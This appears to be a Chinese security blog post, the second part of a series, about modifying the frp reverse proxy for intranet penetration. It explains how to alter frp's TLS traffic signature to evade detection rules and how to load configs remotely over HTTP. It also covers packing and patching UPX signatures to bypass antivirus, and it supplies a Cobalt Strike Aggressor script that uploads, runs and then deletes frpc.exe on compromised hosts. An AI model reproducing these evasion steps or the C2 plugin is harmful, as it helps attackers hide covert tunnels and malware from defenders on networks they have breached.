@@ -1,0 +1,223 @@
+# 内网渗透代理之frp的应用与改造（二）
+|
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+> 上篇：
+## 0x4 frp的改造
+###  0x4.1 修改特征
+正常来说,开了tls加密，流量都会加密,所以是没办法直接检测出来的。
+不过官方文档有说到一个有趣的特征,结合上面的分析确实如此:
+> 从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 `frpc.ini` 的 `common` 中配置
+> `tls_enable = true` 来启用此功能，安全性更高。
+>
+> 为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。
+>
+> 通过将 frps.ini 的 `[common]` 中 `tls_only` 设置为 true，可以强制 frps 只接受 TLS 连接。
+>
+> **注意: 启用此功能后除 xtcp 外，不需要再设置 use_encryption。**
+为了端口复用，所以建立TLS链接的时候,第一个字节为0x17
+用wireshark跟一下流很容易也发现这个固定特征:
+很明显嘛,在这里先发了一个1字节的数据包,作为表示要进行TLS协议巴拉巴拉的。
+然后后面接着一个包就是固定243的大小, emm,你觉得我写个判断frp流量的规则像不像切菜呢？
+简单跟下代码,看看怎么修改这个特征:
+简单理解下TLS协议的工作原理:
+tls协议有个服务端生成证书和密钥的过程,frp是自动实现生成的tls.config:
+怎么生成的呢?
+服务器生成是这个:
+    func generateTLSConfig() *tls.Config {
+        key, err := rsa.GenerateKey(rand.Reader, 1024)
+        if err != nil {
+            panic(err)
+        }
+        template := x509.Certificate{SerialNumber: big.NewInt(1)}
+        certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
+        if err != nil {
+            panic(err)
+        }
+        keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
+        certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
+        tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
+        if err != nil {
+            panic(err)
+        }
+        return &tls.Config{Certificates: []tls.Certificate{tlsCert}}
+客户端InsecureSkipVerify设置了不检验证书:
+    func (svr *Service) login() (conn net.Conn, session *fmux.Session, err error) {
+        xl := xlog.FromContextSafe(svr.ctx)
+        var tlsConfig *tls.Config
+        if svr.cfg.TLSEnable {
+            tlsConfig = &tls.Config{
+                InsecureSkipVerify: true,
+            }
+        }
+        conn, err = frpNet.ConnectServerByProxyWithTLS(svr.cfg.HttpProxy, svr.cfg.Protocol,
+            fmt.Sprintf("%s:%d", svr.cfg.ServerAddr, svr.cfg.ServerPort), tlsConfig)
+        if err != nil {
+            return
+        }
+后来经过我多次的wireshark分析,我发现243大小这个数据包与证书信息是没很大关系的(我也去尝试修改了证书的参数值，发现并没有改变),应该是固定的，应该是yamux建立流通道时的数据,
+同时因为是tcp分段的
+最终会在这个包进行将多个分段合并成一个包,所以后面我决定采取另外一个方案了,通过补充单字节为多字节,这样也能做到一定的混淆。
+很简单，直接通过修改tls.go的处理逻辑:
+最终实现的效果:
+可以看到0x17的特征+后面243字节的特征都已经被修改了，最终socks5插件也是能正常运行的,其他插件没有进行测试,有兴趣的师傅可以仔细跟一下具体的执行流程。
+###  0x4.2 加载配置文件优化
+因为frp不支持命令行设置插件的参数,所以有时候我们需要上传个frpc.ini 是蛮不方便的。
+看了一些网上的修改教程，都是蛮暴力的, 比如直接修改成命令行输入的形式。
+而且挺麻烦的,只改了tcp的，改其他协议又要自己新增，反正我觉得贼麻烦的。
+我们通过分析流程
+`frpc -c frpc.ini`
+传入的参数最终会进入到`runClient`->`config.GetRenderedConfFromFile`
+那么我的想法是啥呢?
+> 原本的不足:
+>
+> 我们平时就是觉得多一个配置文件留在客户端不安全，且麻烦，也难以部署等等
+>
+> 通常来说我们的跳板机都是默认可以访问到我们部署的服务端的,
+>
+> 那么为什么我们不采取远程加载配置文件的方式呢？
+>
+> ex:`frpc -c http://xq17.org/frpc.ini`
+>
+> 这种方式当然也是兼容原来指定本地路径的,也就是说原生功能并不影响。
+>
+> 这种方案好处如下:
+>
+> 1.考虑安全性,可以考虑采取对配置文件进行异或,笔者觉得这个没啥用,你们可以自己发挥
+>
+> 2.针对1,我建议的是,执行成功之后,直接关掉你的远程配置文件就行了,没有那么多花里胡哨的。
+代码如下:
+记得引入一下net.http的库
+`models/config/value.go`修改其中函数为如下:
+    func GetRenderedConfFromFile(path string) (out string, err error) {
+        var b []byte
+        rawUrl := path
+        if strings.Index(rawUrl, "http") != -1{
+            log.Info("http schema")
+            response, _err1 := http.Get(path)
+            if _err1 != nil {
+                panic(_err1)
+            }
+            defer response.Body.Close()
+            body, _err := ioutil.ReadAll(response.Body)
+            if _err != nil {
+                return
+            }
+            content := string(body)
+            out, err = RenderContent(content)
+            return
+        }else{
+            log.Info("local path")
+            b, err = ioutil.ReadFile(path)
+            if err != nil {
+                return
+            }
+            content := string(b)
+            out, err = RenderContent(content)
+            return
+        }
+    }
+看下效果:
+成功解析:
+emmm，感觉还是挺不错的。
+###  0x4.3 压缩体积和免杀
+因为日常环境杀软都是存在于window环境,所以这里只生成window下的frpc.exe来做演示
+    CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o winfrp64.exe main.go
+查看下大小13m:
+    du -m winfrp64.exe
+    -----------    13    winfrp64
+原生编译:
+经过测试:
+卡巴斯基不杀,全家桶不杀,火绒也不杀
+杀毒网测试[VirusTotal](https://www.virustotal.com/#/home/upload):
+有两个国外的杀软识别出是风险文件,很准直接得出是代理工具frp,估计提取了frp的特征来做的:
+>
+> ESET-NOD32
+>
+> A Variant Of Win64/Riskware.Frp.C
+>
+> Symantec
+>
+> FastReverseProxy
+那么怎么解决这个被杀且被识别出frp的问题呢?
+**下面讲讲超级简单的免杀与伪装的思路:**
+尝试upx压缩
+`upx -9 win64frp.exe`
+程序大小压缩了一半变为了7m,然后去检测一下,肯定风险会变高的。
+而且国内最常见的av也报毒了。
+emm,这种不可取,难道要搞点高端操作? 加载器shellcode? 源码免杀,源码混淆?
+也不是不行,不过考虑到有点牛刀小用了。
+我忽然想起来很久以前,自己折腾的无特征免杀的方式
+我自己测试步骤如下:
+> 1.先给程序添加图标、光标等资源
+>
+> 2.然后upx -1 压缩
+>
+> 3.修改一些upx的小特征,替换开头那些upx字符串为u0x之类的,版本信息改高点(修改下upx的解压信息部分)即可
+最终实现的效果如下,不能直接脱掉upx壳,主流杀软也Bypass:
+vt分析结果:
+文件大小也变为原来的1半了,如果你还想更加小,其实还有一些极致的压缩和免杀办法,涉及到程序源文件的一些修改,后面有空可以更深入研究下,做到更底层更极致从而效果更好。
+* * *
+至于那个microsoft不知道怎么回事,
+我测试了几个机器的defender都没杀,所以说,还是勉强可用的吧。(喜欢全绿强迫症的师傅,免杀的方式其实还有很多种,只是没去一一实践。欢迎师傅找我一起探讨呀,)
+## 0x5 frp-CS插件化集成
+  1. 首先我们编译打包所有版本的frp到一个文件夹直接执行下面项目下面这个`package.sh`编译程序即可,(PS.原生免杀,需要小体积如上操作即可)这个到时候我会放在githud的release,因为frp是严格检验版本的,所以需要相同版本，这样也方便小伙伴们直接下载就可以用。
+  2. 开始编写CS插件 
+        popup beacon_bottom {
+        menu "Frp Proxy"{
+            item "Upload" {
+                $bid = $1;
+                $dialog = dialog("Upload frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &upload);
+                drow_text($dialog, "UploadPath",  "path: ");
+                dbutton_action($dialog, "ok");
+                dialog_show($dialog);
+            }
+            sub upload {
+                # switch to specify path
+                bcd($bid, $3['UploadPath']);
+                bsleep($bid, 0 ,0);
+                if (-is64 $bid['id']) {
+                    bupload($bid, script_resource("/script/x64/frpc.exe"));
+                }else{
+                    bupload($bid, script_resource("/script/x86/frpc.exe"));
+                }
+                show_message("Executing cmmand!");
+            }
+            item "Run"{
+                $bid = $1;
+                $dialog = dialog("Run frpc", %(uri => "http://x.x.x.x/frpc.ini or c:\\frpc.ini", bid => $bid), &run);
+                drow_text($dialog, "uri",  "configURI: ");
+                dbutton_action($dialog, "ok");
+                dialog_show($dialog);
+            }
+            sub run{
+                local('$Uri');
+                $Uri =  $3['uri'];
+                bshell($bid, "frpc.exe -c  $+ $Uri ");
+                show_message("Executing cmmand!");
+                bsleep($bid, 30, 0);
+            }
+            item "Delete" {
+                # local("bid");
+                bshell($1, "taskkill /f /t /im frpc.exe &&  del /f /s /q frpc.exe");
+            }
+        }
+    }
+整体来说比较简单,但是因为函数是异步的,所以命令的完整执行得用其他办法去实现,后面我再读读文档,尝试优化下。
+最终完整运行效果如下:
+然后这个项目我放在了我的github:[FrpProPlugin](https://github.com/mstxq17/FrpProPlugin)
+欢迎师傅们给我点个star,和提出完善的思路。
+## 0x6 碎碎念式总结
+本文是基于frp
+V0.33版本来写的,现在frp都更新到0.35了,代码可能产生了部分差异,比如那个0x17的变量就改名了,不过整体没很大差异。还有就是代理工具还有蛮多工具,比如venom在多级代理的时候、通信加密等方面做到也很不错,不过我个人比较喜欢FRP,因为更专业,应用更广泛,功能也更丰富,后面如果有机会,可以将市面常用的代理工具进行对比分析,与大家一起探讨更多姿势。  
+(PS.特征千变万化,少年别只观一处,orz…)
+## 0x7 参考链接
+[知乎提问](https://www.zhihu.com/question/34458124)
+[DNS隧道技术iodine简介](https://zhuanlan.zhihu.com/p/70263701)
+[【ATT&CK】端口转发技术大全(下)](https://mp.weixin.qq.com/s/zwaeUD7-QMTYgvymgw2EVQ)
+[实现SOCKS5协议](https://yuerblog.cc/2019/06/09/%E5%AE%9E%E7%8E%B0socks5%E5%8D%8F%E8%AE%AE/)
+[FRP 内网穿透](https://www.anquanke.com/post/id/184855)
+[cs插件编写参考](https://github.com/Ch1ngg/AggressorScript-UploadAndRunFrp)
+[HTTPS详解二：SSL / TLS 工作原理和详细握手过程](https://segmentfault.com/a/1190000021559557)
+[frp改造](https://sec.lz520520.cn:4430/2020/07/532/)
